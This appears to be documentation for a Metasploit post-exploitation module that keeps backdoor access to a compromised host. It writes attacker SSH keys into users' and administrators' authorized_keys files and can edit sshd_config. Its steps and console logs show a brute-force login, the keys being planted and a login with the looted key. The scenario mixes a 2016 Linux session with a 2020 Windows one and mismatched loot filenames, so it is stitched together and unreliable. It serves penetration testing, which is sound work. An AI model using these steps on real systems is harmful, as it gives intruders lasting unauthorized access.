This module will add an SSH key to a specified user (or all), to allow remote login on the victim via SSH at any time.

### Creating A Testing Environment

  This module has been tested against:

1. Windows 10, 1809

## Verification Steps

  1. Start msfconsole
  2. Exploit a box via whatever method
  3. Do: `use post/windows/manage/sshkey_persistence`
  4. Do: `set session #`
  5. Optional Do: `set USERNAME`
  6. Optional Do: `set SSHD_CONFIG`
  7. Do: `run`


## Options

  **SSHD_CONFIG**

  Location of the sshd_config file on the remote system.  We use this to determine if the authorized_keys file location has changed on the system.  If it hasn't, we default to .ssh/authorized_keys

  **USERNAME**

  If set, we only write our key to this user.  If not, we'll write to all users

  **PUBKEY**

  A public key to use.  If not provided, a pub/priv key pair is generated automatically
  
  **ADMIN_KEY_FILE**
  
  Location of public keys for Administrator level accounts
  
  **ADMIN**
  
  Add public keys for gaining access to Administrator level accounts
  
  **EDIT_CONFIG**
  
  Allow the module to edit the sshd_config to enable public key authentication 

## Scenarios

### Windows 10, 1809

Get initial access

    msf auxiliary(ssh_login) > exploit
    
    [*] SSH - Starting bruteforce
    [+] SSH - Success: 'tiki:tiki' 'uid=1000(tiki) gid=1000(tiki) groups=1000(tiki),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),117(lpadmin),118(sambashare) Linux tikiwiki 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux '
    [!] No active DB -- Credential data will not be saved!
    [*] Command shell session 1 opened (192.168.2.229:38886 -> 192.168.2.190:22) at 2016-06-19 09:52:48 -0400
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed

Use the post module to write the ssh key

    msf auxiliary(ssh_login) > use post/linux/manage/sshkey_persistence 
    msf post(sshkey_persistence) > set SESSION 1
    SESSION => 1
    msf post(sshkey_persistence) > set CREATESSHFOLDER true
    CreateSSHFolder => true    
    msf5 post(windows/manage/sshkey_persistence) > run
    
    [*] Checking SSH Permissions
    [*] Authorized Keys File: .ssh/authorized_keys
    [+] Storing new private key as /Users/dwelch/.msf4/loot/20200205161837_default_172.16.128.153_id_rsa_706898.txt
    [*] Adding key to C:\Users\Dean Welch\.ssh\authorized_keys
    [+] Key Added
    [*] Adding key to C:\Users\testAccount\.ssh\authorized_keys
    [+] Key Added
    [*] Post module execution completed

Verify our access works

    ssh -i /Users/dwelch/.msf4/loot/20200205153101_default_172.16.128.153_id_rsa_457054.txt testAccount@172.16.128.153
    
    Microsoft Windows [Version 10.0.18362.592]
    (c) 2019 Microsoft Corporation. All rights reserved.
    
    testaccount@DESKTOP-V8L6UUD C:\Users\testAccount>

